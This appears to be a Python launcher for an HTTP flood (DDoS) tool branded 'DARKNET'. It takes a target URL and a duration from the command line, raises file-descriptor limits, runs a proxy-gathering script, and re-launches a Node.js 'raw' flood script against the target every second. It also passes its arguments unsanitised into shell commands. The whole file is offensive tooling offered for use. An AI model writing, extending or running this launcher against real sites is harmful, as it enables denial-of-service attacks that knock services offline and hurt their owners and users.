import os
import sys
import requests
import time
import schedule

class color:
   GREEN = '\033[92m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

url = sys.argv[1]
timee = sys.argv[2]
method = "http-raw"

os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
os.system('python3 ./files/proxy.py {} >/dev/null 2>&1'.format(url))
print("")
print("")
print(color.GREEN + "       ╔═══╗ ╔═══╗ ╔═══╗ ╔╗╔═╗ ╔═╗ ╔╗ ╔═══╗ ╔════╗     " + color.END)
print(color.GREEN + "       ╚╗╔╗║ ║╔═╗║ ║╔═╗║ ║║║╔╝ ║ ╚╗║║ ║╔══╝ ║╔╗╔╗║     " + color.END)
print(color.GREEN + "        ║║║║ ║║ ║║ ║╚═╝║ ║╚╝╝  ║╔╗╚╝║ ║╚══╗ ╚╝║║╚╝     " + color.END)
print(color.GREEN + "        ║║║║ ║╚═╝║ ║╔╗╔╝ ║╔╗║  ║║╚╗ ║ ║╔══╝   ║║       " + color.END)
print(color.GREEN + "       ╔╝╚╝║ ║╔═╗║ ║║║╚╗ ║║║╚╗ ║║ ║ ║ ║╚══╗   ║║       " + color.END)
print(color.GREEN + "       ╚═══╝ ╚╝ ╚╝ ╚╝╚═╝ ╚╝╚═╝ ╚╝ ╚═╝ ╚═══╝   ╚╝       " + color.END)
print(color.GREEN + "       ═══════════════════════════════════════════     " + color.END)
print(color.GREEN + "       [URL]:     {}".format(url) + color.END)
print(color.GREEN + "       [TIME]:    {}".format(timee) + color.END)
print(color.GREEN + "       [USED]:    {}".format(method) + color.END)
print(color.GREEN + "       ═══════════════════════════════════════════     " + color.END)
print("")

def job():
    os.system('node ./files/raw.js {} {} >/dev/null 2>&1'.format(url, timee))

schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)